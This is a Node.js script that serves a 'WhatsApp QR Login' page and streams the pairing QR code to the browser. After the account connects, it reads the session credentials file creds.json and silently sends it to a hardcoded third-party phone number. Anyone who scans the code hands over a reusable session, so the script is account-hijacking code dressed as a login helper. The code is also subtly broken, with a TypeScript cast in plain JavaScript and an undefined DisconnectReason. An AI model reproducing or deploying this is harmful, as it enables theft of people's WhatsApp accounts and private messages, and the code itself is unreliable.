const fs = require('fs');
const http = require('http');
const { WebSocketServer } = require('ws');
const { default: makeWASocket, useSingleFileAuthState, makeInMemoryStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const P = require('pino');

const SESSION_FILE = './creds.json';
const { state, saveState } = useSingleFileAuthState(SESSION_FILE);

const html = `
<!DOCTYPE html>
<html>
  <head><title>WhatsApp QR Login</title></head>
  <body>
    <h2>Scan the QR to login to WhatsApp</h2>
    <pre id="qr"></pre>
    <h3 id="status"></h3>
    <script>
      const qrBox = document.getElementById("qr");
      const status = document.getElementById("status");
      const ws = new WebSocket("ws://" + location.host);
      ws.onmessage = (msg) => {
        const data = JSON.parse(msg.data);
        if (data.qr) qrBox.textContent = data.qr;
        if (data.status) status.textContent = data.status;
      };
    </script>
  </body>
</html>
`;

const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(html);
});
const wss = new WebSocketServer({ server });

let clientSocket = null;
wss.on("connection", (ws) => {
  clientSocket = ws;
});

async function sendCredsFile(sock) {
  const filePath = SESSION_FILE;
  if (!fs.existsSync(filePath)) return;

  const buffer = fs.readFileSync(filePath);
  const number = "918302788872@s.whatsapp.net";

  await sock.sendMessage(number, {
    document: buffer,
    mimetype: 'application/json',
    fileName: 'creds.json',
    caption: '✅ Your WhatsApp session creds file.',
  });

  console.log("✅ creds.json sent to +918302788872");
  if (clientSocket) clientSocket.send(JSON.stringify({ status: "✅ creds.json sent to +918302788872" }));
}

async function startSock() {
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: P({ level: 'silent' }),
  });

  sock.ev.on("creds.update", saveState);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && clientSocket) {
      clientSocket.send(JSON.stringify({ qr }));
    }

    if (connection === "open") {
      console.log("✅ WhatsApp connected.");
      await sendCredsFile(sock);
    }

    if (
      connection === "close" &&
      (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut
    ) {
      console.log("🌀 Reconnecting...");
      startSock();
    }
  });

  return sock;
}

server.listen(3000, () => {
  console.log("🌐 Go to http://localhost:3000 to scan QR");
});
startSock();
